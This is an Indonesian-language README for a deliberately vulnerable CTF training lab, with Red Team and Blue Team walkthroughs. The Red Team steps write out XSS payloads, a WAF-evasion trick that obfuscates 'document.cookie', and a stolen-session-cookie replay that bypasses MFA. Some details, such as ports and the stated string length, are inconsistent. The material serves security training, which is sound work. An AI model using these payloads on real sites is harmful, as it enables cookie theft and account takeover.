# CTF Lab - Admin Feedback System

> **Apa ini?**
> Ini adalah lab CTF (Capture The Flag) — sebuah website yang **sengaja dibuat vulnerable (rentan)** untuk latihan keamanan siber.
> Ada 2 jalur: Red Team (menyerang) dan Blue Team (investigasi log).

---

## Daftar Isi

1. [Penjelasan Singkat](#penjelasan-singkat)
2. [Arsitektur](#arsitektur)
3. [Cara Deploy](#cara-deploy)
4. [Red Team Walkthrough](#red-team-walkthrough-jalur-menyerang)
5. [Blue Team Walkthrough](#blue-team-walkthrough-jalur-investigasi)
6. [Struktur File](#struktur-file)
7. [Troubleshooting](#troubleshooting)

---

## Penjelasan Singkat

### Apa yang dilakukan lab ini?

Lab ini mensimulasikan skenario serangan ke "Admin Feedback System" dalam 3 fase:

| Fase | Red Team (Attacker) | Blue Team (Defender) |
|------|--------------------|--------------------|
| 1 | Cari info (recon) | Baca log, identifikasi IP maling |
| 2 | Bypass firewall + inject XSS | Cari alert WAF di log |
| 3 | Masuk admin tanpa MFA | Temukan anomaly & decode bukti |

Setiap "temuan" menghasilkan flag format: `SCENARIO75{jawaban}`

---

## Arsitektur

```
┌─────────────────────────────────────────────────────────┐
│                    Server / VM                           │
│  ┌───────────┐     ┌───────────────┐    ┌───────────┐  │
│  │   Nginx   │────▶│  Node.js App  │    │   Logs    │  │
│  │  :80      │     │  :3000        │    │ /opt/admin │  │
│  └───────────┘     └───────────────┘    │  /logs/   │  │
│                                          └───────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## Cara Deploy

### Yang Dibutuhkan
- Server Linux (Ubuntu/Debian) — bisa VPS, VM Proxmox, atau dedicated server
- Docker & Docker Compose sudah terinstall
- Akses SSH ke server

### Langkah Deploy

```bash
# 1. SSH ke server
ssh user@IP_SERVER

# 2. Clone atau copy project ke server
git clone <url-repo> ~/ctf-lab
cd ~/ctf-lab

# 3. Jalankan semua container
docker-compose up -d --build

# 4. Inject log simulasi serangan (untuk Blue Team)
docker run --rm -v ctf-lab_logs_data:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh
```

### Akses Setelah Deploy

| Service | Cara Akses |
|---------|-----------|
| Web App | `http://IP_SERVER:3075` |
| SSH (Blue Team) | `ssh -p 2275 analyst@IP_SERVER` (password: `blue_team_rocks`) |
| Logs | `/opt/admin/logs/` (dari dalam SSH) |

### Cek Apakah Sudah Jalan

```bash
# Cek container aktif
docker-compose ps

# Cek website bisa diakses
curl -I http://localhost:8080

# Cek log sudah ter-generate
docker exec ctf-feedback-app cat /opt/admin/logs/access.log
docker exec ctf-feedback-app cat /opt/admin/logs/error.log
```

Kalau semua OK, website bisa diakses di: `http://IP_SERVER:3075`

---

## Red Team Walkthrough (Jalur Menyerang)

> **Skenario:** Kamu adalah attacker. Tugasmu adalah menembus website ini sampai masuk ke halaman admin.

### Fase 1: Reconnaissance (Ngumpulin Info)

**Langkah 1 — Cek teknologi apa yang dipakai website ini**

Jalankan:
```bash
curl -I http://IP_SERVER:3075
```

Lihat baris `X-Powered-By: Node.js` — ini memberitahu bahwa backend pakai Node.js.

> 🚩 Flag: `SCENARIO75{Node.js}`

---

**Langkah 2 — Cari halaman tersembunyi dari robots.txt**

Buka di browser: `http://IP_SERVER:3075/robots.txt`

Hasilnya:
```
Disallow: /api/verify-mfa
Disallow: /dashboard
```

Ini bocoran — ada endpoint MFA dan halaman admin dashboard.

> 🚩 Flag: `SCENARIO75{/api/verify-mfa}`
> 🚩 Flag: `SCENARIO75{/dashboard}`

---

**Langkah 3 — Lihat source code HTML**

Di browser, klik kanan → "View Page Source". Cari komentar ASCII art yang bilang:
```
>> Hint: Have you checked robots.txt? <<
```

> 🚩 Flag: `SCENARIO75{robots.txt}`

---

**Langkah 4 — Cek cookie yang diberikan website**

Jalankan:
```bash
curl -v http://IP_SERVER:3075 2>&1 | grep Set-Cookie
```

Output: `Set-Cookie: pre_mfa_session=pending_mfa_verification`

Website otomatis kasih cookie saat pertama kali diakses.

> 🚩 Flag: `SCENARIO75{pre_mfa_session}`
> 🚩 Flag: `SCENARIO75{pending_mfa_verification}`

---

### Fase 2: WAF Bypass + XSS (Bypass Firewall)

**Langkah 5 — Cari tahu method pengiriman form**

Form feedback mengirim data lewat method POST.

> 🚩 Flag: `SCENARIO75{POST}`

---

**Langkah 6 — Coba serangan `<script>` (akan diblock)**

Jalankan:
```bash
curl -X POST http://IP_SERVER:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback":"<script>alert(1)</script>"}'
```

Hasilnya: status **403** — WAF (firewall) memblokir serangan.

> 🚩 Flag: `SCENARIO75{403}`

---

**Langkah 7 — Bypass WAF pakai `<svg>` (berhasil lolos!)**

WAF cuma mengenal `<script>`. Pakai tag HTML5 lain:
```bash
curl -X POST http://IP_SERVER:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback":"<svg onload=alert(1)>"}'
```

Hasilnya: status **200** — WAF tidak mendeteksi, serangan lolos!

> 🚩 Flag: `SCENARIO75{<svg>}`

---

**Langkah 8 — Teknik obfuscation untuk curi cookie**

WAF juga block kata `document.cookie`. Solusinya pakai bracket notation:
```javascript
window['docu'+'ment']['coo'+'kie']
```
WAF tidak bisa mendeteksi ini karena kata-katanya dipecah.

> 🚩 Flag: `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`

---

**Langkah 9 — Cookie bisa dicuri karena HttpOnly = false**

Cookie `pre_mfa_session` tidak dilindungi flag HttpOnly, jadi JavaScript bisa membacanya.

> 🚩 Flag: `SCENARIO75{False}`

---

**Langkah 10 — Kirim cookie curian pakai fetch API**

Attacker menggunakan `fetch()` untuk mengirim cookie ke server miliknya.

> 🚩 Flag: `SCENARIO75{fetch}`

---

### Fase 3: MFA Bypass (Masuk Jadi Admin)

**Langkah 11 — Pakai cookie curian untuk akses dashboard**

Dengan cookie admin yang sudah dicuri, akses dashboard langsung:
```bash
curl http://IP_SERVER:3075/dashboard \
  -H "Cookie: adm_sess=adm_sess_7f3c2d1a9b4e8f6c"
```

Server langsung kasih akses **tanpa verifikasi MFA** (2-factor auth di-skip).

> 🚩 Flag: `SCENARIO75{/api/verify-mfa}`

---

**Langkah 12 — Prefix session admin**

Cookie admin menggunakan prefix `adm_sess`.

> 🚩 Flag: `SCENARIO75{adm_sess}`

---

**Langkah 13 — XSS ter-render di dashboard**

Payload XSS yang dikirim sebelumnya muncul di dalam elemen `<div class="xss-payload">`.

> 🚩 Flag: `SCENARIO75{xss-payload}`

---

**Langkah 14 — FLAG FINAL RED TEAM**

Di halaman dashboard, terlihat:
```
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

> 🏁 **Selamat! Red Team path selesai.**

---

## Blue Team Walkthrough (Jalur Investigasi)

> **Skenario:** Kamu adalah security analyst. Ada insiden keamanan terjadi. Tugasmu menganalisis log untuk mencari tahu apa yang terjadi.

### Fase 1: Log Forensics (Baca Rekaman)

**Langkah 1 — Temukan dimana log disimpan**

```bash
docker exec ctf-feedback-app ls /opt/admin/logs/
```

Hasilnya: `access.log` dan `error.log`

> 🚩 Flag: `SCENARIO75{/opt/admin/logs}`

---

**Langkah 2 — Identifikasi IP attacker**

```bash
docker exec ctf-feedback-app cat /opt/admin/logs/access.log
```

Lihat IP yang mencurigakan: `10.10.14.50` (bukan IP internal perusahaan)
User-Agent-nya: `Mozilla/5.0`

> 🚩 Flag: `SCENARIO75{10.10.14.50}`
> 🚩 Flag: `SCENARIO75{Mozilla/5.0}`

---

**Langkah 3 — Cari kapan attacker berhasil akses dashboard**

```bash
docker exec ctf-feedback-app grep "10.10.14.50.*dashboard.*200" /opt/admin/logs/access.log
```

Terlihat akses sukses (status 200) pada jam `18:51:55`.

> 🚩 Flag: `SCENARIO75{200}`
> 🚩 Flag: `SCENARIO75{18:51:55}`

---

**Langkah 4 — Temukan bukti exfiltrasi data**

Di baris log yang sama, ada string aneh di kolom terakhir:
```
UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
```

Ini adalah data ter-encode yang dikirim attacker.

> 🚩 Flag: `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`

---

### Fase 2: Threat Hunting (Cari Pola Serangan)

**Langkah 5 — Identifikasi traffic normal**

```bash
docker exec ctf-feedback-app grep "192.168.1.100" /opt/admin/logs/access.log
```

IP `192.168.1.100` adalah admin yang sah (traffic normal).

> 🚩 Flag: `SCENARIO75{192.168.1.100}`

---

**Langkah 6 — Tentukan subnet attacker**

IP `10.10.14.50` berada di subnet `10.10.14.0/24`.

> 🚩 Flag: `SCENARIO75{10.10.14.0/24}`

---

**Langkah 7 — Cek alert WAF di error.log**

```bash
docker exec ctf-feedback-app grep "WAF BLOCK" /opt/admin/logs/error.log | head -1
```

Block pertama terjadi jam `18:50:15` untuk payload `<script>`.

> 🚩 Flag: `SCENARIO75{/opt/admin/logs/error.log}`
> 🚩 Flag: `SCENARIO75{<script>}`
> 🚩 Flag: `SCENARIO75{18:50:15}`

---

**Langkah 8 — Apakah attacker pernah lewat MFA?**

```bash
docker exec ctf-feedback-app grep "10.10.14.50.*verify-mfa" /opt/admin/logs/access.log
```

Hasilnya: **kosong** — attacker tidak pernah menyentuh endpoint MFA. Artinya dia bypass.

> 🚩 Flag: `SCENARIO75{No}`

---

### Fase 3: Incident Response (Analisis Lanjutan)

**Langkah 9 — Analisis encoding string mencurigakan**

```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | wc -c
```

String tersebut ter-encode dalam format Base64, panjangnya 44 karakter.

> 🚩 Flag: `SCENARIO75{Base64}`
> 🚩 Flag: `SCENARIO75{44}`

---

**Langkah 10 — Cek level severity tertinggi**

```bash
docker exec ctf-feedback-app grep "CRITICAL" /opt/admin/logs/error.log
```

Event cookie reuse (cookie dipakai ulang oleh IP berbeda) ditandai level **CRITICAL**.

> 🚩 Flag: `SCENARIO75{CRITICAL}`

---

**Langkah 11 — Cari anomaly di timestamp tertentu**

```bash
docker exec ctf-feedback-app grep "18:53:10" /opt/admin/logs/error.log
```

Tertulis: `Authentication bypass anomaly` — konfirmasi bahwa ada bypass authentication.

> 🚩 Flag: `SCENARIO75{18:53:10}`
> 🚩 Flag: `SCENARIO75{Authentication bypass anomaly}`

---

**Langkah 12 — FLAG FINAL BLUE TEAM**

Decode string Base64 yang ditemukan di langkah 4:
```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
```

> 🏁 Flag: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`

---

## Struktur File

```
ctf-lab/
├── docker-compose.yml      ← Menjalankan semua container sekaligus
├── README.md               ← Dokumentasi ini
├── .gitignore
├── app/
│   ├── Dockerfile          ← Instruksi build container aplikasi
│   ├── .dockerignore
│   ├── package.json        ← Daftar dependency Node.js
│   ├── server.js           ← Aplikasi utama (route, cookie, logic)
│   ├── middleware/
│   │   └── waf.js          ← Firewall sederhana (sengaja bisa di-bypass)
│   ├── public/
│   │   ├── robots.txt      ← File yang bocorkan path rahasia
│   │   └── css/
│   │       └── style.css
│   └── views/
│       ├── index.ejs       ← Halaman utama + form feedback
│       ├── dashboard.ejs   ← Halaman admin (target akhir attacker)
│       └── unauthorized.ejs ← Halaman 401 (akses ditolak)
├── nginx/
│   └── nginx.conf          ← Konfigurasi reverse proxy
├── logs/                   ← Volume untuk menyimpan log
└── scripts/
    ├── generate-logs.sh    ← Script inject log simulasi serangan
    └── setup-proxmox.sh    ← Script otomasi setup server
```

---

## Cara Matikan Lab

```bash
cd ~/ctf-lab
docker-compose down -v
```

---

## Troubleshooting

| Masalah | Solusi |
|---------|--------|
| Port 80 already in use | Ganti port di docker-compose.yml (sudah diset ke 8080) |
| Log kosong | Jalankan ulang: `docker run --rm -v ctf-lab_logs_data:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh` |
| Container tidak jalan | Cek: `docker-compose logs` |
| Permission denied di /opt/admin/logs | Jalankan: `sudo chmod 777 /opt/admin/logs` |
